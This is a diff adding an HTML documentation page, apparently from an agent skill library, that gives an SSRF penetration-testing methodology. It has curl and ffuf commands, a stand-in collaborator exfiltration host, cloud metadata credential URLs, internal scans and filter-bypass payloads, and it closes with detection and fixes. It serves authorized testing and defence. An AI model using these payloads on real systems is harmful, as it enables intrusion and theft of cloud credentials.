@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ssrf</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ssrf</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing a web application for Server-Side Request</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a> <a href="recon-active.html">recon-active</a> <a href="xxe.html">xxe</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>ffuf</td><td>2.1.0</td></tr></tbody></table><p>Server-Side Request Forgery happens when the server fetches a URL that the attacker controls, turning the server into a proxy into networks the attacker cannot reach directly. This skill covers the full authorized methodology: finding fetch points, confirming the request leaves the server, exploiting cloud metadata, scanning internal networks, and beating common filters. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map every feature where the server fetches a remote resource: URL</li>
+<p>parameters, webhooks, import-from-URL, avatar upload by URL, PDF or screenshot generators, feed readers, and document parsers.</p>
+<li>Point the parameter at a collaborator or listener you control and</li>
+<p>confirm the server makes an outbound request.</p>
+<li>Try the cloud metadata addresses (169.254.169.254 and provider</li>
+<p>variants) to identify the hosting environment.</p>
+<li>Probe internal IPs and ports to map reachable services.</li>
+<li>Test allow-list and block-list filters with parser differentials,</li>
+<p>redirects, DNS rebinding, and alternate IP encodings.</p>
+<li>Escalate confirmed SSRF to file reads (file://), internal admin</li>
+<p>panels, and credential theft from metadata services.</p>
+<li>For blind SSRF with no response, use time delays and out-of-band data</li>
+<p>exfiltration.</p>
+<li>Record the exact payload, the observed outbound request, and the data</li>
+<p>returned.</p>
+</ol>
+<h2>1. Finding server-fetch inputs</h2>
+<p>Common SSRF sinks: <code>url=</code>, <code>image=</code>, <code>feed=</code>, <code>webhook=</code>, <code>callback=</code>, <code>redirect=</code> (when fetched, not just redirected), avatar upload by URL, &quot;import from link&quot;, HTML-to-PDF converters, and link preview unfurlers.</p>
+<pre><code class="language-bash"># Quick probe: does the parameter reach the network? Point it at your
+# collaborator domain and watch for a hit.
+curl -s -X POST &#x27;https://target.example/api/preview&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;url&quot;:&quot;https://YOURID.oastify.com/probe1&quot;}&#x27; | head -c 400</code></pre>
+<pre><code class="language-bash"># Run a listener to catch the outbound request yourself
+python3 -m http.server 8888 --bind 0.0.0.0 &amp;
+# Then point the SSRF parameter at http://YOUR-PUBLIC-IP:8888/callback</code></pre>
+<p>Burp Collaborator is the standard tool: every payload gets a unique subdomain, and any DNS or HTTP hit proves the server resolved and connected out. Keep a table of payload to collaborator subdomain so each hit maps to the exact request that caused it.</p>
+<h2>2. Confirming and fingerprinting</h2>
+<p>Once a hit lands, learn what the fetcher is: follow redirects or not, which schemes it accepts, and what it does with the response.</p>
+<pre><code class="language-bash"># Does it follow redirects? Point it at a URL you control that 302s
+# elsewhere, and see which host gets the second hit.
+# (Serve this with python http.server using a custom redirect handler,
+# or use a simple PHP/Flask redirector on your VPS.)
+
+# Which schemes are accepted? Try each and watch the collaborator.
+for scheme in http https file ftp dict gopher; do
+  echo &quot;trying $scheme&quot;
+  curl -s -X POST &#x27;https://target.example/api/preview&#x27; \
+    -H &#x27;Content-Type: application/json&#x27; \
+    -d &quot;{\&quot;url\&quot;:\&quot;$scheme://YOURID.oastify.com/$scheme\&quot;}&quot; -o /dev/null
+done</code></pre>
+<p><code>file://</code> reading <code>/etc/passwd</code> is the fastest high-impact proof when it is allowed. <code>dict://</code> and <code>gopher://</code> matter only on old stacks (PHP curl, old Java URL handlers); test them but do not assume they work.</p>
+<h2>3. Cloud metadata exploitation</h2>
+<p>If the target runs on a cloud provider, the metadata service hands out credentials to whoever can reach it.</p>
+<pre><code class="language-bash"># AWS: does the SSRF fetch reach the metadata service?
+# Point the vulnerable parameter at http://169.254.169.254/latest/meta-data/
+# and read what comes back in the application response.
+
+# If the app returns the fetched content, walk the metadata tree:
+# http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# then http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;
+
+# GCP (needs the Metadata-Flavor header; test if the fetcher lets you
+# control headers, otherwise this fails):
+# http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure:
+# http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></pre>
+<p>Other addresses worth trying when 169.254.169.254 is blocked:</p>
+<pre><code class="language-bash"># Alternate encodings of 169.254.169.254 (also useful filter bypasses)
+# decimal:    http://2852039166/
+# octal:      http://0251.0376.0251.0376/
+# hex:        http://0xa9.0xfe.0xa9.0xfe/
+# mixed:      http://169.254.43518/      (169.254.(169*256+254))
+#             http://0xa9fea9fe/</code></pre>
+<p>Stop at reading the role name and proving the credentials endpoint is reachable. Do not exfiltrate live cloud keys beyond what the rules of engagement allow; a screenshot of the role name plus the reachable token URL is usually enough proof.</p>
+<h2>4. Internal network scanning</h2>
+<p>A confirmed SSRF is a port scanner with the server&#x27;s network view. Scan carefully and slowly to avoid tripping network alarms outside the agreed scope.</p>
+<pre><code class="language-bash"># Port scan via response differences: open ports return faster or with
+# different content than closed ones. Automate with ffuf against the SSRF
+# parameter, varying the port.
+ffuf -u &#x27;https://target.example/api/preview&#x27; -X POST \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;url&quot;:&quot;http://127.0.0.1:FUZZ/&quot;}&#x27; \
+  -w /usr/share/seclists/Discovery/Infrastructure/common-ports.txt \
+  -mc 200 -fs 0 -t 5 -p 0.5</code></pre>
+<pre><code class="language-bash"># Sweep the likely internal range one host at a time, slowly
+for host in 10.0.0.5 10.0.0.6 10.0.1.10 172.17.0.2; do
+  curl -s -X POST &#x27;https://target.example/api/preview&#x27; \
+    -H &#x27;Content-Type: application/json&#x27; \
+    -d &quot;{\&quot;url\&quot;:\&quot;http://$host:8080/\&quot;}&quot; -o /tmp/ssrf-$host.html \
+    -w &quot;$host -&gt; %{http_code} %{size_download}b\n&quot;
+done</code></pre>
+<p>Interesting targets: admin panels on high ports (8080, 8443, 9090), Elasticsearch (9200), Redis (6379), MongoDB (27017), Jenkins, and internal APIs that trust the server&#x27;s IP. Read banners from the fetched content to identify services before interacting further.</p>
+<h2>5. Filter bypasses</h2>
+<p>Filters usually block by string matching. Beat them with parser differentials, where the filter sees one host and the fetcher connects to another.</p>
+<pre><code class="language-bash"># 1. Allow-list bypass with @ : filter sees the first host, fetcher
+#    uses the part after the last @ as the real host
+#    https://target.example@YOURID.oastify.com/
+
+# 2. Allow-list bypass with #: fragment is stripped by the fetcher
+#    https://target.example#@YOURID.oastify.com/
+
+# 3. DNS rebinding: register a domain whose DNS alternates between a
+#    public IP (passes the filter check) and 127.0.0.1 (used at fetch
+#    time). Tools like rbndr.us automate the alternating answers.
+
+# 4. Redirect bypass: filter checks the first URL, fetcher follows the
+#    302 to the internal target
+#    Point the parameter at https://your-server/redirect.php
+#    which 302s to http://169.254.169.254/latest/meta-data/
+
+# 5. Case and scheme tricks
+#    HTTP://169.254.169.254/      (uppercase scheme)
+#    http://0x7f.0x0.0x0.0x1/     (hex localhost)
+#    http://2130706433/           (decimal localhost)
+#    http://127.1/                (short form localhost)
+
+# 6. Block-list bypass with URL encoding the filter does not decode
+#    http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/
+
+# 7. Enclosed alphanumerics or unicode dots the filter misses
+#    (test only if the fetcher normalizes them; results vary by stack)</code></pre>
+<p>Always verify the bypass actually fetched the internal target by watching the collaborator or reading returned content, not by guessing.</p>
+<h2>6. Blind SSRF exploitation</h2>
+<p>When the application never returns the fetched content, prove impact out-of-band and with timing.</p>
+<pre><code class="language-bash"># Timing oracle: internal hosts respond at different speeds
+time curl -s -X POST &#x27;https://target.example/api/preview&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;url&quot;:&quot;http://127.0.0.1:22/&quot;}&#x27; -o /dev/null
+time curl -s -X POST &#x27;https://target.example/api/preview&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;url&quot;:&quot;http://127.0.0.1:81/&quot;}&#x27; -o /dev/null</code></pre>
+<pre><code class="language-bash"># Out-of-band exfiltration: if the fetcher follows redirects, bounce the
+# internal response through your server by chaining two SSRF calls, or use
+# DNS exfiltration where the internal data becomes a subdomain:
+# http://&lt;data&gt;.YOURID.oastify.com/  (works when the app echoes the URL
+# into a DNS-resolving context; limited but sometimes enough)</code></pre>
+<p>For blind metadata theft, the redirect chain is the classic: the first fetch hits your redirector, which 302s to the metadata URL, and some fetchers then POST or GET the result back to you if you control the final landing page logic. This is stack dependent, so test each hop with the collaborator first.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The fetcher resolves DNS at filter time and connects by IP at fetch</li>
+<p>time (TOCTOU). DNS rebinding only works in this window; if the app caches the DNS result, rebinding fails.</p>
+<li>The application fetches the URL but only checks the Content-Type</li>
+<p>(image proxy). Try polyglot responses or check whether the proxy follows redirects to non-image URLs.</p>
+<li>IPv6: filters often forget <code>http://[::ffff:169.254.169.254]/</code> and</li>
+<p><code>http://[0:0:0:0:0:ffff:169.254.169.254]/</code>. Test them.</p>
+<li>The SSRF only triggers asynchronously (webhook queue, scheduled</li>
+<p>import). The collaborator hit may arrive minutes later; wait and correlate by unique subdomain per payload.</p>
+<li>WAF blocks <code>169.254.169.254</code> as a string but not its integer forms.</li>
+<p>Rotate through the encodings in section 3.</p>
+<li>The fetcher is a headless browser (screenshot service): it renders</li>
+<p>JavaScript, so <code>file://</code> may be blocked but internal HTTP targets render fully, and you can read rendered content from the screenshot.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Direct metadata IP blocked: try the DNS names</li>
+<p>(<code>instance-data</code> on some clouds, <code>metadata.google.internal</code> on GCP) and the alternate encodings.</p>
+<li>Only HTTP allowed: internal admin panels are usually HTTP anyway;</li>
+<p>pivot to those instead of file reads.</p>
+<li>Response is truncated: fetch <code>http://169.254.169.254/latest/meta-data/</code></li>
+<p>first (small directory listing), then request single keys instead of large documents.</p>
+<li>The fetcher validates the URL with a HEAD request first: your bypass</li>
+<p>must survive both the check request and the real fetch.</p>
+<li>No outbound DNS: use raw IPs only, and exfiltrate through response</li>
+<p>content instead of the collaborator.</p>
+<li>Hitting a dead end on the app server: remember the SSRF runs with the</li>
+<p>server&#x27;s identity, so internal services that trust the server subnet (monitoring dashboards, CI systems, cloud control planes) are the real targets, not just the app server itself.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see SSRF as server-side outbound connections to internal or metadata addresses that no legitimate feature should touch. Key signals: egress firewall logs showing the app server connecting to 169.254.169.254 or RFC 1918 addresses, DNS queries for collaborator-style domains from server hosts, and application logs recording user-supplied URLs that were fetched. The durable fixes are an explicit allow-list of permitted fetch destinations, blocking all private and link-local ranges at the egress layer (not just in application code), disabling unused URL schemes (<code>file://</code>, <code>gopher://</code>, <code>dict://</code>), not following redirects to internal hosts, and requiring IMDSv2 (token-based metadata) on AWS so a bare GET cannot steal credentials. Validate and normalize URLs with a real parser, resolve DNS once, and connect to the resolved IP while re-validating it.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the initial</li>
+<p>fetch point.</p>
+<li>MITRE ATT&amp;CK T1552.005 (Unsecured Credentials: Cloud Instance</li>
+<p>Metadata API): metadata theft.</p>
+<li>MITRE ATT&amp;CK T1018 (Remote System Discovery): internal scanning.</li>
+<li>CWE-918 (Server-Side Request Forgery).</li>
+<li>CWE-20 (Improper Input Validation): filter bypass root cause.</li>
+<li>OWASP Testing Guide: Testing for Server-Side Request Forgery</li>
+<p>(OTG-INPVAL-016).</p>
+<li>OWASP Top 10 2021: A10 Server-Side Request Forgery.</li>
+<li>PortSwigger Web Security Academy: SSRF labs and cheat sheet.</li>
+<li>AWS docs: Instance Metadata Service Version 2 (IMDSv2).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
